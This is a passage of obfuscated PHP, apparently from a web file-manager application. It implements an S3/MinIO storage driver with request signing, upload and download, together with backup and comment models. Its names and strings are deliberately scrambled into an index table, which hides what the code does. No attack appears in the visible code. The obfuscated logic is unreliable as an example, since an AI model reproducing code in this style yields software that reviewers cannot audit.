$ŞÜÎàä[$Íù²³™İ[78]]; } } private function fileInfo($¾ó£êıå, $Òñùï• = false, $Ö²•°şÌ = array()) { $Šƒ…ûĞ¬ =& $_SERVER[èùÙ¹Ïö]; $çÇ„…Ã’ = array($Šƒ…ûĞ¬[32] => $this->pathThis($¾ó£êıå), $Šƒ…ûĞ¬[86] => $this->getPathOuter($¾ó£êıå), $Šƒ…ûĞ¬[33] => $Šƒ…ûĞ¬[216], $Šƒ…ûĞ¬[177] => $this->ext($¾ó£êıå), $Šƒ…ûĞ¬[78] => isset($Ö²•°şÌ[$Šƒ…ûĞ¬[78]]) ? $Ö²•°şÌ[$Šƒ…ûĞ¬[78]] : 0); if ($Òñùï•) { return $çÇ„…Ã’; } $çÇ„…Ã’[$Šƒ…ûĞ¬[217]] = $çÇ„…Ã’[$Šƒ…ûĞ¬[87]] = 0; $çÇ„…Ã’[$Šƒ…ûĞ¬[218]] = $çÇ„…Ã’[$Šƒ…ûĞ¬[219]] = !0; if (empty($Ö²•°şÌ)) { $Ö²•°şÌ = $this->objectMeta($¾ó£êıå); if (!$Ö²•°şÌ) { return $çÇ„…Ã’; } } if (isset($Ö²•°şÌ[$Šƒ…ûĞ¬[220]]) && $Ö²•°şÌ[$Šƒ…ûĞ¬[220]]) { $çÇ„…Ã’[$Šƒ…ûĞ¬[221]] = $Ö²•°şÌ[$Šƒ…ûĞ¬[220]]; } if (isset($Ö²•°şÌ[$Šƒ…ûĞ¬[196]])) { $çÇ„…Ã’[$Šƒ…ûĞ¬[87]] = $Ö²•°şÌ[$Šƒ…ûĞ¬[196]]; } if (isset($Ö²•°şÌ[$Šƒ…ûĞ¬[78]])) { $çÇ„…Ã’[$Šƒ…ûĞ¬[78]] = $Ö²•°şÌ[$Šƒ…ûĞ¬[78]]; } return $çÇ„…Ã’; } private function folderInfo($ó¾éü†š, $Œå™òİ¶ = false, $æš•±½ = array()) { $ô®·šÓ© =& $_SERVER[èùÙ¹Ïö]; $òÆ–»ñ¨ = array($ô®·šÓ©[32] => $this->pathThis($ó¾éü†š), $ô®·šÓ©[86] => $this->getPathOuter($ô®·šÓ©[8] . $ó¾éü†š), $ô®·šÓ©[33] => $ô®·šÓ©[77]); if ($Œå™òİ¶) { return $òÆ–»ñ¨; } $òÆ–»ñ¨[$ô®·šÓ©[217]] = $òÆ–»ñ¨[$ô®·šÓ©[87]] = 0; $òÆ–»ñ¨[$ô®·šÓ©[218]] = $òÆ–»ñ¨[$ô®·šÓ©[219]] = !0; if ($ó¾éü†š == $ô®·šÓ©[12]) { return $òÆ–»ñ¨; } if (empty($æš•±½)) { $æš•±½ = $this->objectMeta(trim($ó¾éü†š, $ô®·šÓ©[8]) . $ô®·šÓ©[8]); } if (isset($æš•±½[$ô®·šÓ©[196]])) { $òÆ–»ñ¨[$ô®·šÓ©[217]] = $æš•±½[$ô®·šÓ©[196]]; } return $òÆ–»ñ¨; } private function fileList($´½šÔéÇ, $³Ô€¼© = '', $¹âõÀ£â = 0) { $€¿ïÕŞ– =& $_SERVER[èùÙ¹Ïö]; $æô©Ùó = rtrim($´½šÔéÇ, $€¿ïÕŞ–[8]) . $€¿ïÕŞ–[8]; $¶„ñÍÔÀ = $this->listObjs($æô©Ùó, null, null, $³Ô€¼©); if (!$¶„ñÍÔÀ) { return array($€¿ïÕŞ–[84] => array(), $€¿ïÕŞ–[85] => array()); } $ÌºÚŞœ± = $í©«ÌÒÚ = array(); foreach ($¶„ñÍÔÀ[$€¿ïÕŞ–[222]] as $½ãú´) { $„îşşÉ = $½ãú´[$€¿ïÕŞ–[32]]; if ($„îşşÉ == $æô©Ùó) { continue; } $”âàÖ‚‰ = isset($½ãú´[$€¿ïÕŞ–[78]]) ? $½ãú´[$€¿ïÕŞ–[78]] : 0; $ñ¥îÏıÌ = $”âàÖ‚‰ == 0 && substr($„îşşÉ, strlen($„îşşÉ) - 1, 1) == $€¿ïÕŞ–[8] ? !0 : !1; $this->cacheMethodInfoSet($„îşşÉ, $ñ¥îÏıÌ, $½ãú´); if ($ñ¥îÏıÌ) { $ÌºÚŞœ±[] = $„îşşÉ; continue; } $í©«ÌÒÚ[] = $¹âõÀ£â ? $½ãú´ : $„îşşÉ; } foreach ($¶„ñÍÔÀ[$€¿ïÕŞ–[223]] as $½ãú´) { $ÌºÚŞœ±[] = $½ãú´[$€¿ïÕŞ–[32]]; $this->cacheMethodInfoSet($½ãú´[$€¿ïÕŞ–[32]], !0); } $this->cacheMethodInfoSet($´½šÔéÇ, !0); return array($€¿ïÕŞ–[84] => $ÌºÚŞœ±, $€¿ïÕŞ–[85] => $í©«ÌÒÚ); } private function listObjs($¼¦Šá’ø, $Â…ÕıŠ = null, $ú†»¯Ú† = null, $‰¬¡õÖ = null) { $éôèËÇ =& $_SERVER[èùÙ¹Ïö]; $¼¦Šá’ø = trim($¼¦Šá’ø, $éôèËÇ[8]); $ºßµá÷¨ = empty($¼¦Šá’ø) && $¼¦Šá’ø !== $éôèËÇ[214] ? $éôèËÇ[12] : $¼¦Šá’ø . $éôèËÇ[8]; return $this->client->getBucket($this->bucket, $ºßµá÷¨, $Â…ÕıŠ, $ú†»¯Ú†, $‰¬¡õÖ, !0); } public function has($ğçè¡ˆ, $ÓúıÔËŠ = false, $¬àœ½ø§ = true) { $üÕàç£  =& $_SERVER[èùÙ¹Ïö]; $ğçè¡ˆ = trim($ğçè¡ˆ, $üÕàç£ [8]); $µå±Ø¶Â = empty($ğçè¡ˆ) && $ğçè¡ˆ !== $üÕàç£ [214] ? $üÕàç£ [12] : $ğçè¡ˆ . $üÕàç£ [8]; $ÈŞ´„í” = null; $õşöªÁ = 500; $¬Œ–ƒâà = $üÕàç£ [8]; $ü¦“ÃÍü = $€–°¿œÔ = array(); while (!0) { $¯£‹ˆ¥ = $this->listObjs($ğçè¡ˆ, $ÈŞ´„í”, $õşöªÁ, $¬Œ–ƒâà); if (!$¯£‹ˆ¥) { break; } $ÈŞ´„í” = $¯£‹ˆ¥[$üÕàç£ [224]]; $œí‰Ì‘› = $¯£‹ˆ¥[$üÕàç£ [222]]; $ ø¿ËØ = $¯£‹ˆ¥[$üÕàç£ [223]]; if (empty($œí‰Ì‘›) && empty($ ø¿ËØ)) { break; } if (count($œí‰Ì‘›) == 1 && $œí‰Ì‘›[0][$üÕàç£ [32]] == $µå±Ø¶Â) { break; } if ($ÓúıÔËŠ) { if (count($œí‰Ì‘›)) { $œí‰Ì‘› = array_column($œí‰Ì‘›, $üÕàç£ [32]); $ü¦“ÃÍü = array_merge($ü¦“ÃÍü, $œí‰Ì‘›); } if (count($ ø¿ËØ)) { $ ø¿ËØ = array_column($ ø¿ËØ, $üÕàç£ [32]); $€–°¿œÔ = array_merge($€–°¿œÔ, $ ø¿ËØ); } if ($ÈŞ´„í” === null) { break; } continue; } if ($¬àœ½ø§) { if (!empty($œí‰Ì‘›)) { if (count($œí‰Ì‘›) > 1 || isset($œí‰Ì‘›[0][$üÕàç£ [32]]) && $œí‰Ì‘›[0][$üÕàç£ [32]] != $µå±Ø¶Â) { return !0; } } } else { if (!empty($ ø¿ËØ)) { return !0; } } if ($ÈŞ´„í” === null) { break; } } if ($ÓúıÔËŠ) { $ü¦“ÃÍü = array_diff($ü¦“ÃÍü, array($µå±Ø¶Â)); $ü¦“ÃÍü = count(array_unique($ü¦“ÃÍü)); $€–°¿œÔ = count(array_unique($€–°¿œÔ)); return array($üÕàç£ [225] => $ü¦“ÃÍü, $üÕàç£ [226] => $€–°¿œÔ); } return !1; } public function listAll($‚°À³Â) { $èû›Ö =& $_SERVER[èùÙ¹Ïö]; $É•²­×¢ = $this->fileList($‚°À³Â, $èû›Ö[12], !0); $ããê¾£Ø = array_to_keyvalue($É•²­×¢[$èû›Ö[85]], $èû›Ö[32]); foreach ($É•²­×¢[$èû›Ö[84]] as $‡°¯¤Ú¡) { if (is_string($‡°¯¤Ú¡)) { $ããê¾£Ø[$‡°¯¤Ú¡] = array($èû›Ö[78] => 0); } } return $this->listAllFiles($‚°À³Â, $ããê¾£Ø); } public function canRead($Ì”çËò˜) { $í·‚ÄÖ =& $_SERVER[èùÙ¹Ïö]; $î‚€ÜÔ = $this->client->getAccessControlPolicy($this->bucket, $Ì”çËò˜); if (!$î‚€ÜÔ) { return !1; } return in_array($î‚€ÜÔ, array($í·‚ÄÖ[227], $í·‚ÄÖ[228], $í·‚ÄÖ[229])) ? !0 : !1; } public function canWrite($Ó×¨Ö•) { $¬ºüÛ¤¶ =& $_SERVER[èùÙ¹Ïö]; $Ö¿£îËÎ = $this->client->getAccessControlPolicy($this->bucket, $Ó×¨Ö•); if (!$Ö¿£îËÎ) { return !1; } return in_array($Ö¿£îËÎ, array($¬ºüÛ¤¶[227], $¬ºüÛ¤¶[228])) ? !0 : !1; } public function getContent($»°ÜÔ‰›) { return $this->client->getObject($this->bucket, $»°ÜÔ‰›); } public function setContent($™”˜ÃÏñ, $Í§»åÍ« = '', $ÛÏàğÜû = false) { $âëØä”’ =& $_SERVER[èùÙ¹Ïö]; $™”˜ÃÏñ = $ÛÏàğÜû ? trim($™”˜ÃÏñ, $âëØä”’[8]) . $âëØä”’[8] : $™”˜ÃÏñ; $é¦Œ¸æ‘ = get_file_mime(get_path_ext($™”˜ÃÏñ)); $»öæíğş = $this->client->putObject($Í§»åÍ«, $this->bucket, $™”˜ÃÏñ, $âëØä”’[215], array(), $é¦Œ¸æ‘); if (!$»öæíğş) { return !1; } if ($ÛÏàğÜû) { return !0; } $this->cacheMethod(null, null); $»öæíğş = $this->copyFile($™”˜ÃÏñ, $™”˜ÃÏñ, array($âëØä”’[230] => $»öæíğş[$âëØä”’[220]])); return $»öæíğş ? !0 : !1; } public function fileSubstr($¦¾“¦±Ó, $•«ã¦ô†, $Çõù®—ô) { $äÒï´Ş— = $•«ã¦ô† + $Çõù®—ô - 1; return $this->client->getObject($this->bucket, $¦¾“¦±Ó, array($_SERVER[èùÙ¹Ïö][231] => "\142\171\164\145\163\75{$•«ã¦ô†}\x2d{$äÒï´Ş—}")); } public function upload($¤ò°¹Ö·, $˜­¬…øÅ, $×¯¡»Ó¢ = false, $î™Ä‰ˆ™ = REPEAT_REPLACE) { $·àÎŠÊØ =& $_SERVER[èùÙ¹Ïö]; $ş·ßÍ™ı = array($·àÎŠÊØ[230] => @md5_file($˜­¬…øÅ)); $Í¦ØÓÉî = array($·àÎŠÊØ[232] => get_file_mime(get_path_ext($¤ò°¹Ö·))); if (IO::size($˜­¬…øÅ) <= 1024 * 1024 * 200) { $¶ÑÜı§à = $this->client->putObjectFile($˜­¬…øÅ, $this->bucket, $¤ò°¹Ö·, $·àÎŠÊØ[215], $ş·ßÍ™ı, $Í¦ØÓÉî); return !empty($¶ÑÜı§à) ? $this->getPathOuter($¤ò°¹Ö·) : !1; } $Ãˆ÷ßô… = $this->client->multiUploadObject($˜­¬…øÅ, $this->bucket, trim($¤ò°¹Ö·, $·àÎŠÊØ[8]), $ş·ßÍ™ı, $Í¦ØÓÉî); return $Ãˆ÷ßô… ? $this->getPathOuter($¤ò°¹Ö·) : !1; } public function download($şœÕÙâÓ, $ğñå»Ï—) { if (!@is_dir($this->pathFather($ğñå»Ï—)) && !IO::mkdir($this->pathFather($ğñå»Ï—))) { return !1; } $×Ä²´Óë = $this->client->getObject($this->bucket, $şœÕÙâÓ, array(), $ğñå»Ï—); return $×Ä²´Óë !== !1 ? $ğñå»Ï— : !1; } public function link($úâÃäÖ, $¬ö•äî™ = array()) { $é×ÌšüÑ =& $_SERVER[èùÙ¹Ïö]; if ($this->signVer == $é×ÌšüÑ[233]) { return $this->client->getAuthenticatedURL($this->bucket, $úâÃäÖ, 3600 * 12, $¬ö•äî™); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($úâÃäÖ, $é×ÌšüÑ[8]), 3600 * 12, $this->region, array(), !0, $¬ö•äî™); } public function fileOut($ä•„Á‹Ó, $Ğ°ÙñÉˆ = false, $Ø‰¨Çı = false, $îÕ±¨İÒ = '') { $Âå…‘ß =& $_SERVER[èùÙ¹Ïö]; if ($this->isFileOutServer()) { return $this->fileOutServer($ä•„Á‹Ó, $Ğ°ÙñÉˆ, $Ø‰¨Çı, $îÕ±¨İÒ); } if (!$Ø‰¨Çı) { $Ø‰¨Çı = $this->pathThis($ä•„Á‹Ó); } $Ù“ğÀİÛ = get_file_mime(get_path_ext($Ø‰¨Çı)); if ($Ù“ğÀİÛ == $Âå…‘ß[234]) { return parent::fileOut($ä•„Á‹Ó, $Ğ°ÙñÉˆ, $Ø‰¨Çı, $îÕ±¨İÒ); } $ÙÎÍ¼İ = array($Âå…‘ß[235] => $Ù“ğÀİÛ); if ($Ğ°ÙñÉˆ) { $ÙÎÍ¼İ[$Âå…‘ß[236]] = $Âå…‘ß[237] . rawurlencode($Ø‰¨Çı); } else { } $«õïî = $this->link($ä•„Á‹Ó, $ÙÎÍ¼İ); $this->fileOutLink($«õïî); } public function fileOutServer($Õ™‚çªµ, $›ÂˆÇÙ§ = false, $§Ş—àÕæ = false, $ Ç•ÛÇî = '') { parent::fileOut($Õ™‚çªµ, $›ÂˆÇÙ§, $§Ş—àÕæ, $ Ç•ÛÇî); } public function fileOutImageServer($ĞÏºŸ°ö, $‰­ª·ò = 250) { parent::fileOutImage($ĞÏºŸ°ö, $‰­ª·ò); } public function hashMd5($¾¢®ü…Ã, $ÁÏáÒÖµ = '') { $—Ù¢óÔ =& $_SERVER[èùÙ¹Ïö]; $šË«—ÓĞ = $this->objectMeta($¾¢®ü…Ã); if (!$šË«—ÓĞ) { return !1; } $ÁÏáÒÖµ = $ÁÏáÒÖµ ? $ÁÏáÒÖµ : _get($šË«—ÓĞ, $—Ù¢óÔ[238]); $ÁÏáÒÖµ = $ÁÏáÒÖµ ? $ÁÏáÒÖµ : _get($šË«—ÓĞ, $—Ù¢óÔ[220], $—Ù¢óÔ[12]); return $ÁÏáÒÖµ; } public function uploadFormData($æ¯ú¸óı, $¢ìãÍèç = 3600) { $Şœıºæğ =& $_SERVER[èùÙ¹Ïö]; $÷»‰•¸š = $this->pathFather($æ¯ú¸óı); $ÔÀŠ÷Ãû = $this->client->getHttpUploadPostParams($this->bucket, $÷»‰•¸š, $Şœıºæğ[215], $¢ìãÍèç); return array_merge((array) $ÔÀŠ÷Ãû, array($Şœıºæğ[198] => $this->getHost())); } public function multiUploadFormData($ı’µ¾äŠ, $×¼”û = 3600) { $òœ¦´ÈÃ =& $_SERVER[èùÙ¹Ïö]; $Æñå¥‚½ = gmdate($òœ¦´ÈÃ[239]); $è‹›¤Äß = array(); $Ü–Öµ¢ = $this->client->getUploadId($this->bucket, $ı’µ¾äŠ, $è‹›¤Äß); if (!$Ü–Öµ¢) { return !1; } return array($òœ¦´ÈÃ[240] => $Ü–Öµ¢, $òœ¦´ÈÃ[198] => $this->getHost() . $òœ¦´ÈÃ[8] . $this->pathEncode($ı’µ¾äŠ), $òœ¦´ÈÃ[241] => $Æñå¥‚½, $òœ¦´ÈÃ[96] => $ı’µ¾äŠ); } public function multiUploadAuthData($áäĞÁé©, $†äÌÏ™† = array()) { $×‡ òÌ× =& $_SERVER[èùÙ¹Ïö]; $úãóÕØù = isset($†äÌÏ™†[$×‡ òÌ×[241]]) ? $†äÌÏ™†[$×‡ òÌ×[241]] : gmdate($×‡ òÌ×[239]); $Î€¥ëó = isset($†äÌÏ™†[$×‡ òÌ×[177]]) ? $†äÌÏ™†[$×‡ òÌ×[177]] : $×‡ òÌ×[12]; $¼¼‰Ô•“ = $†äÌÏ™†[$×‡ òÌ×[96]]; unset($†äÌÏ™†[$×‡ òÌ×[96]]); if (isset($†äÌÏ™†[$×‡ òÌ×[242]])) { $†äÌÏ™†[$×‡ òÌ×[241]] = $úãóÕØù; return $this->listUploadParts($¼¼‰Ô•“, $†äÌÏ™†); } $†ÔÁÜö— = array($×‡ òÌ×[243], $×‡ òÌ×[12], $×‡ òÌ×[122], $×‡ òÌ×[12], "\x78\x2d\x61\155\172\55\144\141\x74\x65\72{$úãóÕØù}", $×‡ òÌ×[8] . $this->bucket . $×‡ òÌ×[8] . $this->pathEncode($¼¼‰Ô•“) . $Î€¥ëó); if (strpos($Î€¥ëó, $×‡ òÌ×[244]) === 0) { $†ÔÁÜö—[0] = $×‡ òÌ×[245]; } if (isset($†äÌÏ™†[$×‡ òÌ×[246]]) && $†äÌÏ™†[$×‡ òÌ×[246]] == $×‡ òÌ×[247]) { $†ÔÁÜö—[0] = $×‡ òÌ×[247]; } $¸Áäñé¶ = implode($×‡ òÌ×[248], $†ÔÁÜö—); $Å’’ç×® = base64_encode(hash_hmac($×‡ òÌ×[249], $¸Áäñé¶, $this->secret, !0)); $¥ëºñ‰ö = $×‡ òÌ×[250] . $this->accessKey . $×‡ òÌ×[4] . $Å’’ç×®; if (strpos($Î€¥ëó, $×‡ òÌ×[244]) === 0) { return array($×‡ òÌ×[251] => $¥ëºñ‰ö, $×‡ òÌ×[241] => $úãóÕØù); } return $¥ëºñ‰ö; } public function listUploadParts($±”èõ°•, $µÅ•Ğ = array()) { $òÏ÷‚ûä =& $_SERVER[èùÙ¹Ïö]; $¡ŸõÓ—† = str_replace($òÏ÷‚ûä[252], $òÏ÷‚ûä[12], $µÅ•Ğ[$òÏ÷‚ûä[177]]); $ÕõúñÓĞ = $this->client->listParts($this->bucket, $±”èõ°•, $¡ŸõÓ—†); if (!$ÕõúñÓĞ) { return !1; } unset($µÅ•Ğ[$òÏ÷‚ûä[242]], $µÅ•Ğ[$òÏ÷‚ûä[246]]); $µÅ•Ğ[$òÏ÷‚ûä[96]] = $±”èõ°•; $ˆÖÅù¡ = $this->multiUploadAuthData($±”èõ°•, $µÅ•Ğ); if (empty($ˆÖÅù¡)) { return !1; } return array($òÏ÷‚ûä[251] => $ˆÖÅù¡, $òÏ÷‚ûä[241] => $µÅ•Ğ[$òÏ÷‚ûä[241]], $òÏ÷‚ûä[253] => $ÕõúñÓĞ); } public function getHost() { return parent::getHost() . $_SERVER[èùÙ¹Ïö][8] . $this->bucket; } public function size($Ü¯©·Ü³) { $ÊÉÀÂİœ = $this->objectMeta($Ü¯©·Ü³); return $ÊÉÀÂİœ ? $ÊÉÀÂİœ[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function info($ß½œÅÒº) { if ($this->isFolder($ß½œÅÒº)) { return $this->folderInfo($ß½œÅÒº); } else { if ($this->isFile($ß½œÅÒº)) { return $this->fileInfo($ß½œÅÒº); } } return !1; } public function exist($İ®Ÿ©äÆ) { return $this->isFile($İ®Ÿ©äÆ) || $this->isFolder($İ®Ÿ©äÆ); } public function isFile($ö®åëŸ) { return !$this->isFolder($ö®åëŸ) && $this->objectMeta($ö®åëŸ); } public function isFolder($Ó£¨†Éø) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][168], $Ó£¨†Éø); } protected function objectMeta($Š¨ç³¡¯) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][170], $Š¨ç³¡¯); } protected function _objectMeta($ ş“Äìµ) { $š§×ñú“ =& $_SERVER[èùÙ¹Ïö]; $ ş“Äìµ = rtrim($ ş“Äìµ, $š§×ñú“[8]); try { $ãì´éá = $this->client->getObjectInfo($this->bucket, $ ş“Äìµ); if (!isset($ãì´éá[$š§×ñú“[238]]) && isset($ãì´éá[$š§×ñú“[254]])) { $ãì´éá[$š§×ñú“[238]] = $ãì´éá[$š§×ñú“[254]]; } } catch (Exception $äŠŸ¡ù˜) { $ãì´éá = !1; } if (!$ãì´éá) { } return $ãì´éá; } protected function _isFolder($ìº†£ÀŠ) { $”øßŸŸÇ =& $_SERVER[èùÙ¹Ïö]; $ìº†£ÀŠ = rtrim($ìº†£ÀŠ, $”øßŸŸÇ[8]); if ($ìº†£ÀŠ == $”øßŸŸÇ[12] || $ìº†£ÀŠ == $”øßŸŸÇ[8]) { return !0; } $øÆ˜àå˜ = $this->client->getBucket($this->bucket, $ìº†£ÀŠ, null, 1); if (empty($øÆ˜àå˜[$”øßŸŸÇ[222]])) { return !1; } $Î„°Ìâ = $øÆ˜àå˜[$”øßŸŸÇ[222]][0][$”øßŸŸÇ[32]]; return stripos($Î„°Ìâ, $ìº†£ÀŠ . $”øßŸŸÇ[8]) === 0 ? !0 : !1; if (substr($Î„°Ìâ, -1) == $”øßŸŸÇ[8]) { return !0; } if (get_path_this($Î„°Ìâ) == get_path_this($ìº†£ÀŠ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Òú°ü²) { parent::__construct($Òú°ü²); $this->signatureVersion($_SERVER[èùÙ¹Ïö][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($çó¯Àß, $Ê“ĞÇ‡… = 3600) { $å«ÂÅÆ¶ =& $_SERVER[èùÙ¹Ïö]; $÷­»º‹¾ = $å«ÂÅÆ¶[215]; $áò»ÀÂß = $å«ÂÅÆ¶[255]; $ÕÜĞ…Æò = $å«ÂÅÆ¶[62]; $£Â‰ŸÁ = gmdate($å«ÂÅÆ¶[256]); $‹œğ‹é = gmdate($å«ÂÅÆ¶[257]); $¼ÁÆİÍ¦ = $å«ÂÅÆ¶[258]; $ˆìÄ• = $Ê“ĞÇ‡… . $å«ÂÅÆ¶[12]; $İıã¢‘ = $å«ÂÅÆ¶[259]; $–ÚíÄøò = array($this->accessKey, $‹œğ‹é, $this->region, $ÕÜĞ…Æò, $¼ÁÆİÍ¦); $ç¾¬Ë‡° = implode($å«ÂÅÆ¶[8], $–ÚíÄøò); $”®éÙ›Ê = array($å«ÂÅÆ¶[260] => gmdate($å«ÂÅÆ¶[261], strtotime($å«ÂÅÆ¶[262])), $å«ÂÅÆ¶[263] => array(array($å«ÂÅÆ¶[264] => $this->bucket), array($å«ÂÅÆ¶[265] => $÷­»º‹¾), array($å«ÂÅÆ¶[266], $å«ÂÅÆ¶[267], $å«ÂÅÆ¶[12]), array($å«ÂÅÆ¶[266], $å«ÂÅÆ¶[268], $å«ÂÅÆ¶[12]), array($å«ÂÅÆ¶[266], $å«ÂÅÆ¶[269], $å«ÂÅÆ¶[12]), array($å«ÂÅÆ¶[270] => $İıã¢‘), array($å«ÂÅÆ¶[271] => $ç¾¬Ë‡°), array($å«ÂÅÆ¶[272] => $áò»ÀÂß), array($å«ÂÅÆ¶[273] => $£Â‰ŸÁ), array($å«ÂÅÆ¶[274] => $ˆìÄ•))); $Ç¨èëï¶ = base64_encode(json_encode($”®éÙ›Ê)); $¼©š–íÔ = hash_hmac($å«ÂÅÆ¶[275], $‹œğ‹é, $å«ÂÅÆ¶[276] . $this->secret, !0); $Ö»£ Ö¯ = hash_hmac($å«ÂÅÆ¶[275], $this->region, $¼©š–íÔ, !0); $ øŠà¢ = hash_hmac($å«ÂÅÆ¶[275], $ÕÜĞ…Æò, $Ö»£ Ö¯, !0); $ú–Š­Ëş = hash_hmac($å«ÂÅÆ¶[275], $¼ÁÆİÍ¦, $ øŠà¢, !0); $¨ì²ªÙ¯ = hash_hmac($å«ÂÅÆ¶[275], $Ç¨èëï¶, $ú–Š­Ëş); $·éáåóâ = array($å«ÂÅÆ¶[232] => $å«ÂÅÆ¶[12], $å«ÂÅÆ¶[277] => $å«ÂÅÆ¶[12], $å«ÂÅÆ¶[265] => $÷­»º‹¾, $å«ÂÅÆ¶[270] => $İıã¢‘, $å«ÂÅÆ¶[278] => $Ç¨èëï¶, $å«ÂÅÆ¶[279] => $ç¾¬Ë‡°, $å«ÂÅÆ¶[280] => $áò»ÀÂß, $å«ÂÅÆ¶[281] => $£Â‰ŸÁ, $å«ÂÅÆ¶[282] => $ˆìÄ•, $å«ÂÅÆ¶[283] => $¨ì²ªÙ¯, $å«ÂÅÆ¶[198] => $this->getHost()); return $·éáåóâ; } } goto AßŠ¾ÄğÎ; EÎå¢¹Àö­: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x62\141\x63\x6b\165\160\114\x69\x73\164"; public $field = array("\151\157", "\156\x61\155\x65", "\x73\x74\141\164\165\x73", "\143\x6f\156\x74\x65\x6e\164", "\155\x61\156\165\141\x6c", "\162\145\163\165\154\164", "\164\x69\155\x65\106\x72\x6f\x6d", "\x74\151\x6d\145\124\157"); public function config() { $şä³éó =& $_SERVER[èùÙ¹Ïö]; $ı¤ÂĞÜ˜ = Model($şä³éó[810])->get($şä³éó[820]); $ı¤ÂĞÜ˜ = json_decode($ı¤ÂĞÜ˜, !0); $ı¤ÂĞÜ˜ = is_array($ı¤ÂĞÜ˜) ? $ı¤ÂĞÜ˜ : array(); if (!isset($ı¤ÂĞÜ˜[$şä³éó[794]])) { $ı¤ÂĞÜ˜[$şä³éó[794]] = $şä³éó[90]; } unset($ı¤ÂĞÜ˜[$şä³éó[1666]]); Action($şä³éó[1919])->taskInit(); Model($şä³éó[1665])->cacheClear(); $×ŸŠ½Í = $şä³éó[1920]; $Ïã³€îş = Model($şä³éó[1921])->findByKey($şä³éó[1684], $×ŸŠ½Í); if (!$Ïã³€îş) { $Ïã³€îş = array(); } if (isset($Ïã³€îş[$şä³éó[196]])) { $Ïã³€îş[$şä³éó[196]] = json_decode($Ïã³€îş[$şä³éó[196]], !0); } if (isset($ı¤ÂĞÜ˜[$şä³éó[196]])) { $Ïã³€îş[$şä³éó[196]][$şä³éó[1669]] = $ı¤ÂĞÜ˜[$şä³éó[196]]; unset($ı¤ÂĞÜ˜[$şä³éó[196]]); } return array_merge($Ïã³€îş, $ı¤ÂĞÜ˜); } public function listData($ §ïéëß = false, $¦ùãíàŠ = "\x6d\157\x64\151\x66\x79\124\x69\x6d\145", $ˆ…§†êÚ = false) { return parent::listData($ §ïéëß, $¦ùãíàŠ, !0); } public function lastItem() { $‹Ä­ó‚ = $this->listData(); return !empty($‹Ä­ó‚[0]) ? $‹Ä­ó‚[0] : null; } public function kill($öâÜÙ´) { $õÄñç÷“ =& $_SERVER[èùÙ¹Ïö]; $ÙËË¥‡ = $this->listData($öâÜÙ´); if (!$ÙËË¥‡ || empty($ÙËË¥‡[$õÄñç÷“[32]])) { return !0; } Task::kill($õÄñç÷“[819]); Task::kill($õÄñç÷“[840]); Task::kill($õÄñç÷“[849]); $úÏ— = $ÙËË¥‡[$õÄñç÷“[32]]; $¨µúô× = TEMP_FILES . $õÄñç÷“[818] . $úÏ— . $õÄñç÷“[8]; IO::remove($¨µúô×, !1); return $this->remove($öâÜÙ´); } public function remove($¸¦Ëã›±) { $¦¶²Ï¹Ã = $this->listData($¸¦Ëã›±); if (!$¦¶²Ï¹Ã) { return !0; } return $this->backupRemove($¦¶²Ï¹Ã); } private function backupRemove($È¡¢–ı¡) { parent::remove($È¡¢–ı¡[$_SERVER[èùÙ¹Ïö][445]]); $ä¹—¤˜ = $this->backupPath($È¡¢–ı¡); IO::remove($ä¹—¤˜, !1); return !0; } private function backupPath($§¸šü…õ) { $ğñ´à¨Ï =& $_SERVER[èùÙ¹Ïö]; $è•à¿€í = $§¸šü…õ[$ğñ´à¨Ï[32]]; $Û×Ûç = Model($ğñ´à¨Ï[810])->get($ğñ´à¨Ï[811]); $¡Œ‡ì¸ş = substr(md5($ğñ´à¨Ï[812] . $Û×Ûç . $è•à¿€í), 0, 8); return "\x7b\x69\x6f\72{$§¸šü…õ[$ğñ´à¨Ï[791]]}\175\x2f\144\x61\164\x61\x62\141\163\145\57\142\141\x63\153\x75\160\x2f" . $è•à¿€í . $ğñ´à¨Ï[11] . $¡Œ‡ì¸ş; } public function start() { $­™ÜØ†Ï =& $_SERVER[èùÙ¹Ïö]; if ($GLOBALS[$­™ÜØ†Ï[6]][$­™ÜØ†Ï[91]][$­™ÜØ†Ï[1922]] != $­™ÜØ†Ï[90]) { return !0; } $…şíîÚ— = $this->config(); if (!$…şíîÚ— || $…şíîÚ—[$­™ÜØ†Ï[1666]] != $­™ÜØ†Ï[90]) { return !1; } $Èãí–®Ì = $this->process(); foreach ($Èãí–®Ì as $­ÑÛğº) { if ($­ÑÛğº) { return Task::restart($­ÑÛğº[$­™ÜØ†Ï[445]]); } } $£ôø£ìõ = new Backup(); $—Ò„‹Ô¸ = $£ôø£ìõ->db(); if ($—Ò„‹Ô¸) { $—Ò„‹Ô¸ = $£ôø£ìõ->dbFile(); if ($—Ò„‹Ô¸ && $…şíîÚ—[$­™ÜØ†Ï[794]] == $­™ÜØ†Ï[214]) { $—Ò„‹Ô¸ = $£ôø£ìõ->file(); } } Backup::set(array($­™ÜØ†Ï[790] => 1, $­™ÜØ†Ï[801] => time())); return !0; } public function process() { $¢Û¤—Œå =& $_SERVER[èùÙ¹Ïö]; $š–˜Ÿ¤ = array($¢Û¤—Œå[797] => Task::get($¢Û¤—Œå[819]), $¢Û¤—Œå[802] => Task::get($¢Û¤—Œå[840]), $¢Û¤—Œå[216] => Task::get($¢Û¤—Œå[849])); $¼ø®Ü¯ = !1; foreach ($š–˜Ÿ¤ as &$ı®æè) { if ($¼ø®Ü¯) { $ı®æè = !1; continue; } if ($ı®æè) { $¢‰ëúëô = intval(_get($ı®æè, $¢Û¤—Œå[1701], 0)); if (time() - $¢‰ëúëô > 7200) { Task::kill($ı®æè[$¢Û¤—Œå[445]]); $¼ø®Ü¯ = !0; $ı®æè = !1; } } } return $š–˜Ÿ¤; } public function restore() { $ğÑúè®é =& $_SERVER[èùÙ¹Ïö]; ActionCall($ğÑúè®é[1106], !0, 1); ActionCall($ğÑúè®é[1106], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\x65\156\164"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\141\x6d\145" => "\143\157\155\155\x65\x6e\164\x5f\x6d\145\164\x61", 